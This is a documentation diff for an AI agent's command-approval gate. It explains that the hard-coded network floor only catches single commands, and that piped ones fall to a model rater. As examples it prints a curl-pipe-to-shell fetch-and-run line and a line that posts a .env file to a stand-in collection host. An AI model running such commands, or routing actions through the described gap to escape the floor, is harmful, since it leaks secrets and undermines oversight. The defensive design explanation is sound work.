@@ -112,10 +112,19 @@ stored fetch target redirects every later fetch rather than one.
 If you fetch from the same host all day, put it in `approvals.allow` (below). That list is checked
 first, so it costs no prompt and no rating call.
 
-This check is a floor, not the whole of your safety: it knows the common network tools, not every
-program that can open a socket, so something like `svn checkout https://…` or a container that
-fetches for itself reaches the rater without it. What it guarantees is the other direction — where it
-does fire, no model opinion can wave the command through.
+This check is a floor, not the whole of your safety, and it has two edges. It knows the common
+network tools, not every program that can open a socket, so something like `svn checkout https://…`
+or a container that fetches for itself reaches the rater without it. And it applies to a command the
+gate can read as **one** command: `curl -fsSL https://get.example.com/i.sh | sh` and
+`cat .env | curl -X POST --data-binary @- https://collect.example.net` are several commands joined
+together, so the gate cannot resolve what they run as a whole and does not floor them. Those go to
+the rater instead — and it is told the host **and what flows to it**, which is the part no single
+piece of the line shows: that one of them reads a local file and the next one sends it, or that
+what the fetch returns is handed to a shell to run. So a joined-up fetch rests on the rater's
+judgement where a plain one does not.
+
+What the floor guarantees is the other direction — where it does fire, no model opinion can wave the
+command through.
 
 The rater is only as good as the model behind it. On a small or local model, prefer the `write` rung
 (below) or point the rater at a stronger model with `approvals.rater`.
